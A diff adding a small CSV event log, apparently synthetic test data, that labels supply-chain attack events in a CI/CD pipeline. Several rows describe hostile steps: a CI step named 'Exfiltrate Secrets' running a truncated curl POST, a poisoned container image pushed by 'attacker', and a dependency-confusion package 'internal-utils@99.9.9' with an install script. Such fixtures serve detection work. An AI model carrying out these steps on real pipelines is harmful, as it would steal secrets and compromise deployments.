@@ -1,0 +1,8 @@
+Timestamp,Source,Event,Details,Attack_ID
+2026-02-05T10:00:00Z,Git,Commit,Author: alice, Message: initial commit,N/A
+2026-02-05T14:26:40Z,Harbor,Image Push,User: jenkins-ci, Digest: sha256:abcd...,N/A
+2026-02-05T14:30:16Z,CI Runner,Step Execution,Step: Exfiltrate Secrets, Command: curl -X POST...,Attack-1
+2026-02-05T14:28:20Z,Harbor,Image Push,User: attacker, Digest: sha256:bad1...,Attack-4
+2026-02-05T14:28:40Z,Harbor,Image Pull,User: kubernetes-deployer, Digest: sha256:bad1...,Attack-4
+2026-02-05T15:00:00Z,Git,Commit,Author: mallory, Message: fix: update health check logging,Attack-2
+2026-02-05T15:05:00Z,CI Build,NPM Install,Package: internal-utils@99.9.9, Script: node -e require...,Attack-3
